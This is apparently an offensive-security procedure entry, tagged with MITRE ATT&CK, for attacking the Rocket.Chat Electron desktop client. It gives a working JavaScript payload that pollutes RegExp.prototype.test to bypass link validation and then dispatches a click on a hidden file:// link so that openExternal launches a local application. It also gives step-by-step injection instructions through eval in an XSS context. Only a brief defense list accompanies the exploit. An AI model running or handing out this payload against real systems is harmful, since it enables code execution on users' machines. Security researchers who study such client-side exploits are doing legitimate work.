---
tags:
  - prototype-pollution
  - javascript
type: procedure
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/rocket-chat-prototype-pollution-payload]]'
verified: false
platforms:
  - Electron
  - Desktop
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:41.657Z'
skill_level: advanced
impact_level: high
detection_risk: low
sub_techniques: []
id: 7ec0dd29-507b-41a3-9cf2-97e3a2b41ff3
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
---
# Inject-JavaScript-Payload-for-Prototype-Pollution

## Summary

This procedure uses the XSS context to inject a JavaScript payload that performs prototype pollution on RegExp.prototype.test, bypassing the Rocket.Chat desktop client's regex validation for external links in the onclick handler.

## Description

The Electron webview in Rocket.Chat validates external links (e.g., file:// protocols) using regex in the document.onclick handler before calling electron.shell.openExternal. By overwriting RegExp.prototype.test to return true for the target payload after 3 legitimate calls (mimicking normal usage), the attacker crafts a hidden <a> element with an arbitrary href, appends it, and prepares to dispatch a click event. This targets macOS in the example but generalizes to other OSes.

## Requirements

1. Active XSS execution context in the webview
2. Knowledge of the regex check logic (external protocols like file://)
3. Target URL adjusted for host OS (e.g., Calculator.app on macOS)

## Defense

Defensive measures and detection strategies:

- Use non-prototype methods for validation (e.g., direct regex instantiation)
- Implement webview sandboxing with nodeIntegration=false
- Monitor for prototype modifications via integrity checks

## Objectives

1. Pollute RegExp.prototype to evade link validation
2. Create synthetic link element with malicious URL
3. Set up for click dispatch to trigger openExternal

## Instructions

### Step 1: Craft the Payload

**Context**: Define the target URL and counter logic to delay bypass until after initial regex calls.

Use [[commands/rocket-chat-prototype-pollution-payload]]:

```javascript
(function(){const payload =`file:///System/Applications/Calculator.app`;var counter =0;var target = document.createElement(`a`); target.setAttribute(`href`, payload); document.body.appendChild(target);var old_test =RegExp.prototype.test;RegExp.prototype.test=function(s){if(s === payload){return(++counter >3);}returnold_test.call(this, s);}; target.dispatchEvent(new MouseEvent(`click`));})();
```

> Note: Fixed 'newEvent' to 'new MouseEvent' for validity. Payload creates link and overrides test.

### Step 2: Inject via XSS

**Context**: Execute the payload string in the webview context using the prior XSS.

Inject as: `eval('PASTE_FULL_PAYLOAD_HERE');`

> Console shows overridden prototype; inspect DOM for appended <a>.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used

- [[commands/rocket-chat-prototype-pollution-payload]]

## Tools Used


## Tags

- [[prototype-pollution]]
- [[electron]]
